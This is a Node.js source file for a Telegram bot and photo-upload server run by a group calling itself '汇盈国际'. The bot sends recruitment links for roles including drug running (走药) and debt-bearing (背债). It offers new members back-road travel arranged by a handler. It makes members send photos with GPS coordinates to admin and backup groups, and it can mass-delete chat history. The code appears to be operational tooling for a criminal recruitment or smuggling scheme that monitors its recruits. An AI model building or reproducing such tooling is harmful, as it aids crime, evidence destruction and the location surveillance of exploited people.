const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');
const cors = require('cors');

// ==================== 1. 全局配置区 ====================
// 解决多实例冲突
let botInstance = null;
const bot = new Telegraf(process.env.BOT_TOKEN);

// 允许运行机器人的群组 ID 列表
const GROUP_CHAT_IDS = [
  -1003354803364,
  -1003381368112,
  -1003308598858,
  -1003368574609,
  -1003286063197,
  -1003378109615,
  -1003293673373,
  -1003203365614,
  -1000000000009,
  -1000000000010
];
const BACKUP_GROUP_ID = -1003293673373; // 备份群ID
const WEB_APP_URL = 'https://huiying8.netlify.app'; // 你的前端网址
const AUTH_FILE = './authorized.json'; // 授权文件路径
const INITIAL_TEXT = '填写招聘申请时请打开手机录屏，按照上面顺序排列填写资料后拍照关闭手机录屏后发送到此群里！';

// 内存数据库 (用于临时存储状态)
const pendingTasks = new Map();
let authorizedUsers = new Map(); // 授权用户列表
const warningMessages = new Map(); // 警告消息记录
const unauthorizedMessages = new Map();
const zlMessages = new Map(); // 招聘消息记录

// 招聘链接配置
const ZL_LINKS = {
  '租车': 'https://che88.netlify.app',
  '大飞': 'https://fei88.netlify.app',
  '走药': 'https://yao88.netlify.app',
  '背债': 'https://bei88.netlify.app'
};
// 中介链接配置
const ZJ_LINKS = {
  '租车': 'https://zjc88.netlify.app',
  '大飞': 'https://zjf88.netlify.app',
  '走药': 'https://zjy88.netlify.app',
  '背债': 'https://zjb88.netlify.app'
};

// ==================== 2. 工具函数区 ====================

// 加载授权文件
function loadAuth() {
    try {
        if (fs.existsSync(AUTH_FILE)) {
            const data = fs.readFileSync(AUTH_FILE, 'utf8');
            const parsed = JSON.parse(data);
            authorizedUsers.clear();
            for (let [key, value] of Object.entries(parsed)) {
                authorizedUsers.set(Number(key), value);
            }
            console.log('授权文件加载成功，当前授权用户数:', authorizedUsers.size);
        } else {
             console.log('授权文件不存在，将自动创建');
        }
    } catch (error) {
        console.log('授权文件加载失败，使用空Map', error);
    }
}

// 保存授权文件
function saveAuth() {
    try {
        fs.writeFileSync(AUTH_FILE, JSON.stringify(Object.fromEntries(authorizedUsers)));
    } catch (error) {
        console.error('保存授权失败:', error);
    }
}
// 启动时加载
loadAuth();

// 出厂设置 (清空所有数据)
function factoryReset() {
    authorizedUsers.clear();
    pendingTasks.clear();
    warningMessages.clear();
    unauthorizedMessages.clear();
    zlMessages.clear();
    try {
        if (fs.existsSync(AUTH_FILE)) {
            fs.unlinkSync(AUTH_FILE);
        }
        console.log('出厂设置完成: 所有状态清空，授权文件已删除');
    } catch (error) {
        console.error('删除授权文件失败:', error);
    }
}

// 发送图片和定位到群组
async function sendToChat(chatId, photoBuffer, caption, lat, lng) {
    try {
        await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
            caption,
            parse_mode: 'HTML' // 使用 HTML 模式以支持点击名字跳转
        });
        
        // 只有当坐标有效且不为 0,0 (测试模式) 时才发送定位
        if (lat && lng && (lat !== 0 || lng !== 0)) {
            await bot.telegram.sendLocation(chatId, lat, lng);
        }
    } catch (error) {
        console.error(`发送到群 ${chatId} 失败:`, error);
        // 尝试发送错误报告到备份群
        try {
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, `⚠️ 发送失败报告: 群 ${chatId} - ${error.message}`);
        } catch {}
    }
}

// 检查是否为管理员
async function isAdmin(chatId, userId) {
    try {
        const member = await bot.telegram.getChatMember(chatId, userId);
        return member.status === 'administrator' || member.status === 'creator';
    } catch (error) {
        console.error('检查管理员权限失败:', error);
        return false;
    }
}

// ==================== 3. Bot 核心逻辑区 ====================

// 中间件：私聊拦截保护
bot.use(async (ctx, next) => {
    if (ctx.message && ctx.chat?.type === 'private') {
        const userId = ctx.from.id;
        const userName = ctx.from.first_name || '未知用户';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : '无用户名';
        const messageText = ctx.message.text || '[非文本消息]';
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        
        const replyText = `❌ 🔒本机器人只供汇盈国际内部使用，你没有权限访问。如果有疑问，请联系汇盈国际负责人授权。🚫🚫`;
        try {
            await ctx.reply(replyText);
            const reportText = `🚨**私信访问警报**🚨\n\n` +
                `👤用户: ${userName} ${userUsername}\n` +
                `🆔ID: ${userId}\n` +
                `📝消息内容: ${messageText}\n` +
                `⏰时间: ${timestamp}\n\n` +
                `汇盈国际 - 安全监控系统`;
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, reportText, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Private message handling failed:', error);
        }
        return;
    }
    await next();
});

// 指令: /bz - 帮助菜单
bot.command('bz', (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const helpText = `📋汇盈国际官方机器人指令面板\n\n` +
        `/hc - 换车安全确认拍照 (点击直接打开)\n` +
        `/boss - Boss 要求指定用户拍照 (点击直接打开)\n` +
        `/lg - 龙哥要求指定用户拍照 (点击直接打开)\n` +
        `/zjhc - 生成中介换车链接 (发给客户用)\n` +
        `/zl - 招聘申请链接生成\n` +
        `/zj - 招聘申请链接生成 (中介链接)\n` +
        `/qc - 彻底恢复出厂\n` +
        `/lh - 踢出用户\n` +
        `/lj - 生成当前群组邀请链接\n` +
        `/bz - 显示此说明\n\n`;
    ctx.reply(helpText);
});

// 指令: /lj - 生成邀请链接
bot.command('lj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('无权限！ /lj 只限汇盈国际负责人使用。');
    
    try {
        const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
        const linkText = `🔗汇盈国际官方对接群链接 \n\n🔗点击下方按钮直接加入群！`;
        ctx.reply(linkText, {
            reply_markup: {
                inline_keyboard: [[{ text: '👉直接点击加入群', url: inviteLink }]]
            }
        });
    } catch (error) {
        ctx.reply('生成链接失败！ 检查 Bot 权限 (can_invite_users)。');
    }
});

// 指令: /qc - 清空群聊并重置
bot.command('qc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('❌ 🔒无权限！');

    let startMessageId = ctx.message.message_id;
    if (ctx.message.reply_to_message) startMessageId = ctx.message.reply_to_message.message_id;

    ctx.reply(`开始彻底清空群聊所有记录...`);
    
    // 循环删除消息 (带防死循环逻辑)
    let deletedCount = 0;
    let i = 1;
    let maxAttempts = 500; 
    let consecutiveFails = 0;

    while (i <= maxAttempts && consecutiveFails < 10) {
        try {
            await bot.telegram.deleteMessage(chatId, startMessageId - i);
            deletedCount++;
            consecutiveFails = 0;
            i++;
            await new Promise(r => setTimeout(r, 40)); 
        } catch (error) {
            consecutiveFails++;
            i++; 
        }
    }
    
    factoryReset(); // 清除数据
    ctx.reply(`✅ 出厂设置已完成！数据已重置。`);
});

// 指令: /zl - 招聘链接
bot.command('zl', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('❌ 🔒无权限！');

    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;

    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            try {
                const user = await bot.telegram.getChatMember(chatId, `@${match[1]}`);
                targetUserId = user.user.id;
                targetFirstName = user.user.first_name || '未知';
                targetUsername = `@${match[1]}`;
            } catch (e) { return ctx.reply('用户不存在或不在群内'); }
        } else {
            return ctx.reply('请回复用户消息或输入 /zl @用户名');
        }
    }

    try {
        const replyMsg = await ctx.reply(`${INITIAL_TEXT}\n\n👤请选择申请类型：`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '租车', callback_data: 'zl_租车' }, { text: '大飞', callback_data: 'zl_大飞' }],
                    [{ text: '走药', callback_data: 'zl_走药' }, { text: '背债', callback_data: 'zl_背债' }]
                ]
            }
        });
        zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zl', chatId });
    } catch (error) { ctx.reply('指令执行失败'); }
});

// 指令: /zj - 中介链接
bot.command('zj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('❌ 🔒无权限！');

    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name;
        targetUsername = replyTo.from.username;
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
             try {
                const user = await bot.telegram.getChatMember(chatId, `@${match[1]}`);
                targetUserId = user.user.id;
                targetFirstName = user.user.first_name;
                targetUsername = `@${match[1]}`;
            } catch (e) { return ctx.reply('用户不存在'); }
        } else {
             return ctx.reply('请回复用户或@用户');
        }
    }

    try {
        const replyMsg = await ctx.reply(`${INITIAL_TEXT}\n\n👤请选择中介申请类型：`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '租车', callback_data: 'zj_租车' }, { text: '大飞', callback_data: 'zj_大飞' }],
                    [{ text: '走药', callback_data: 'zj_走药' }, { text: '背债', callback_data: 'zj_背债' }]
                ]
            }
        });
        zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zj', chatId });
    } catch (error) { ctx.reply('失败'); }
});

// 指令: /lh - 拉黑用户
bot.command('lh', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return;
    
    let targetUserId;
    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id;
    } else {
        return ctx.reply('请回复要拉黑的人的消息');
    }
    
    try {
        await bot.telegram.banChatMember(chatId, targetUserId);
        ctx.reply('用户已拉黑');
    } catch (e) { ctx.reply('拉黑失败，请检查Bot权限'); }
});

// 指令: /boss - Boss 拍照请求 (Web App 模式)
bot.command('boss', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return;

    let targetUser, targetUserId;
    if (ctx.message.reply_to_message) {
        targetUser = ctx.message.reply_to_message.from.first_name;
        targetUserId = ctx.message.reply_to_message.from.id;
    } else {
        return ctx.reply('请回复用户消息');
    }

    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}`;

    const replyMsg = await ctx.reply(`汇盈国际负责人Boss要求你拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
        reply_markup: {
            inline_keyboard: [[
                { text: '📷点击拍照', web_app: { url: webAppUrl } }
            ]]
        },
        parse_mode: 'HTML'
    });
});

// 指令: /lg - 龙哥拍照请求 (Web App 模式)
bot.command('lg', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return;

    let targetUser, targetUserId;
    if (ctx.message.reply_to_message) {
        targetUser = ctx.message.reply_to_message.from.first_name;
        targetUserId = ctx.message.reply_to_message.from.id;
    } else {
        return ctx.reply('请回复用户消息');
    }

    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}`;

    const replyMsg = await ctx.reply(`汇盈国际负责人龍哥要求你拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
        reply_markup: {
            inline_keyboard: [[
                { text: '📷点击拍照', web_app: { url: webAppUrl } }
            ]]
        },
        parse_mode: 'HTML'
    });
});

// 指令: /hc - 换车拍照 (需授权, Web App 模式)
bot.command('hc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);

    if (!isAuthorized && !isAdminUser) return ctx.reply('无权限，请先让管理员授权');

    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${userId}&name=${encodeURIComponent(ctx.from.first_name)}`;

    await ctx.reply('为了保障你的安全换车前请拍照！', {
        reply_markup: {
            inline_keyboard: [[
                { text: '📷开始拍照', web_app: { url: webAppUrl } }
            ]]
        }
    });
});

// 指令: /zjhc - 中介换车专属链接
bot.command('zjhc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    
    // 只有管理员或授权中介可用
    if (!isUserAdmin) return ctx.reply('无权限');

    // 关键逻辑：name 设置为 '中介客户-代理名'
    const agentId = ctx.from.id;
    const agentName = ctx.from.first_name;
    const clientName = `中介客户-${agentName}`; // 这里定义了上传时显示的名字
    
    const clientLink = `${WEB_APP_URL}/?chatid=${chatId}&uid=${agentId}&name=${encodeURIComponent(clientName)}`;

    const msg = `🔗 **中介换车专属链接**\n\n` +
                `请复制下方链接发送给你的客户，让他用浏览器打开拍照：\n\n` +
                `${clientLink}`;
    
    // disable_web_page_preview: true 防止预览挡住视线
    ctx.reply(msg, { parse_mode: 'Markdown', disable_web_page_preview: true });
});

// 事件: 新成员进群
bot.on('new_chat_members', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const newMembers = ctx.message.new_chat_members.filter(m => !m.is_bot);
    
    for (const member of newMembers) {
        authorizedUsers.set(member.id, false);
        saveAuth();
        try {
            await bot.telegram.restrictChatMember(chatId, member.id, { permissions: { can_send_messages: false } });
        } catch (e) {}
        const warningMsg = await ctx.reply(`🚫欢迎 ${member.first_name}，你没有权限发言，请联系负责人授权！`);
        warningMessages.set(warningMsg.message_id, { userId: member.id, userName: member.first_name });
    }
    
    await ctx.reply(`请选择你的出行方式：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: `负责人安排走小路`, callback_data: 'travel_land' }],
                [{ text: `坐飞机`, callback_data: 'travel_flight' }]
            ]
        }
    });
});

// 事件: 文本消息 (鉴权与授权)
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId);
    const isAdminUser = await isAdmin(chatId, userId);
    
    // 如果不是管理员且未授权，删除消息
    if (!isAdminUser && !isAuthorized) {
        try { await ctx.deleteMessage(); } catch (e) {}
        return; 
    }

    // 管理员回复“授权”处理
    if (isAdminUser && ctx.message.reply_to_message && ctx.message.text.trim() === '授权') {
        const replyToId = ctx.message.reply_to_message.message_id;
        let targetData = warningMessages.get(replyToId) || unauthorizedMessages.get(replyToId);
        
        // 如果缓存里没找到，尝试直接获取被回复者的信息
        if (!targetData) {
            targetData = {
                userId: ctx.message.reply_to_message.from.id,
                userName: ctx.message.reply_to_message.from.first_name
            };
        }

        if (targetData) {
            const { userId: targetUserId, userName } = targetData;
            authorizedUsers.set(targetUserId, true);
            saveAuth();
            
            // 赋予所有权限
            try {
                await bot.telegram.restrictChatMember(chatId, targetUserId, {
                    permissions: {
                        can_send_messages: true,
                        can_send_audios: true,
                        can_send_documents: true,
                        can_send_photos: true,
                        can_send_videos: true,
                        can_send_video_notes: true,
                        can_send_voice_notes: true,
                        can_send_polls: true,
                        can_send_other_messages: true,
                        can_add_web_page_previews: true,
                        can_change_info: false,
                        can_invite_users: true,
                        can_pin_messages: false
                    }
                });
                await ctx.reply(`✅已完整授权 ${userName} (ID: ${targetUserId})！\n他现在可以发送图片、定位和消息了。`);
                warningMessages.delete(replyToId);
                unauthorizedMessages.delete(replyToId);
            } catch (error) {
                console.error('Auth error:', error);
                ctx.reply('授权失败，请检查Bot是否有管理员权限');
            }
        }
    }
});

// 事件: 按钮回调处理
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;

    // 出行方式选择
    if (data === 'travel_land' || data === 'travel_flight') {
        const text = data === 'travel_land' 
            ? '🚨🔥上车安全提醒...\n\n欢迎新成员！' 
            : '上车前要拍照到此群核对...';
        
        try {
            await ctx.deleteMessage();
            const newMsg = await ctx.reply(text);
            await bot.telegram.pinChatMessage(chatId, newMsg.message_id);
        } catch (e) {}
        return ctx.answerCbQuery();
    }
    
    // ZL/ZJ 招聘链接回调
    if (data.startsWith('zl_') || data.startsWith('zj_')) {
        const commandType = data.startsWith('zl_') ? 'zl' : 'zj';
        const buttonKey = data.split('_')[1];
        const stored = zlMessages.get(ctx.callbackQuery.message.message_id);
        
        if (stored) {
             const links = commandType === 'zl' ? ZL_LINKS : ZJ_LINKS;
             const link = links[buttonKey];
             const userInfo = `TG名字: ${stored.targetFirstName}\nTG用户名: ${stored.targetUsername}\nID: ${stored.targetUserId}`;
             
             const instruction = commandType === 'zl'
                ? '点击上方链接打开浏览器进行填写，填写时记住要录屏填写！填写好了发到此群！'
                : '发给你的客户让客户打开浏览器进行填写，填写时记住要录屏填写！填写好了发到此群！';

             await ctx.editMessageText(`${INITIAL_TEXT}\n\n${userInfo}\n\n申请链接：<a href="${link}">${buttonKey}链接</a>\n复制链接: ${link}\n\n${instruction}`, {
                 parse_mode: 'HTML',
                 disable_web_page_preview: false
             });
        }
        return ctx.answerCbQuery();
    }
    
    ctx.answerCbQuery();
});

// ==================== 4. Express 服务器区 ====================
const expressApp = express();
expressApp.use(cors()); // 允许跨域
expressApp.use(express.raw({ type: '*/*', limit: '10mb' })); // 处理图片流

// 图片上传处理接口
expressApp.post('/upload', async (req, res) => {
  try {
    const photoBuffer = req.body;
    // 获取URL参数
    const { lat, lng, name = '汇盈用户', uid = '未知', time, chatid } = req.query;
    
    if (!chatid) return res.status(400).json({ code: 1, msg: '缺少 chatid' });
    
    const latitude = parseFloat(lat) || 0;
    const longitude = parseFloat(lng) || 0;
    const isTestMode = (latitude === 0 && longitude === 0);

    const formattedTime = time ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
                                : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
    
    // 地图链接
    const googleMapUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
    const amapUrl = `https://amap.com/dir?destination=${longitude},${latitude}`;
    
    let locationText = `位置：${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
    if (isTestMode) locationText = `位置：(测试模式-无定位)`;

    // === 核心修改：名字可点击跳转 ===
    // 使用 HTML 格式： <a href="tg://user?id=123">名字</a>
    // 注意：uid 如果是 '未知' 则不生成链接
    let userLink = name;
    if (uid && uid !== '未知') {
        userLink = `<a href="tg://user?id=${uid}">${name}</a>`;
    }

    const caption = `<b>[安全换车照片]</b>\n` +
                    `👤用户：${userLink} (ID:${uid})\n` +
                    `⏰时间：${formattedTime}\n` +
                    `📍${locationText}\n` +
                    `🗺️<a href="${amapUrl}">高德地图</a> | <a href="${googleMapUrl}">谷歌地图</a>`;

    // 发送到主群
    if (GROUP_CHAT_IDS.includes(Number(chatid))) {
      await sendToChat(Number(chatid), photoBuffer, caption, latitude, longitude);
    }
    // 发送到备份群
    await sendToChat(BACKUP_GROUP_ID, photoBuffer, `[备份] ${caption}`, latitude, longitude);
    
    res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('H5上传失败:', err);
    res.status(500).json({ code: 1, msg: err.message });
  }
});

expressApp.get('/', (req, res) => res.send('Bot Running OK!'));

const PORT = process.env.PORT || 10000;
expressApp.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    bot.launch().then(() => console.log('Telegram Bot Started!'));
});

// 优雅退出
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
